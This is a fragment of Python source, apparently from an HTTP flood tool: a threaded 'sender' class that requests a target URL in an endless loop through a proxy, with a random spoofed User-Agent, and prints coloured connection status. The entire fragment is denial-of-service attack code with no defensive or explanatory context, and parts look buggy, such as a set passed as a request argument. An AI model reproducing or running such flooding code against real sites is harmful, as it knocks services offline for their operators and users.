class sender(threading.Thread):

    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = {'User-Agent': random.choice(useragents)}
        self.accept = {random.choice(useragents)}
        self.Lock = threading.Lock()
        self.proxy = proxy

    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener)
        req = urllib.request.Request(self.url, data, self.headers, self.accept)
        urllib.request.urlopen(req) 
        print(Fore.GREEN+'Connected: '+Fore.CYAN+'%s\r' % self.url) 
        
             
        
    def run(self):
        self.Lock.acquire()
        self.Lock.release()
        while True:
            try:
                self.request()               
            except:
                sys.stdout.write(Fore.RED+'Connect : '+Fore.BLUE+'Fail !\n')
                sys.exit(0)

        sys.exit(0)


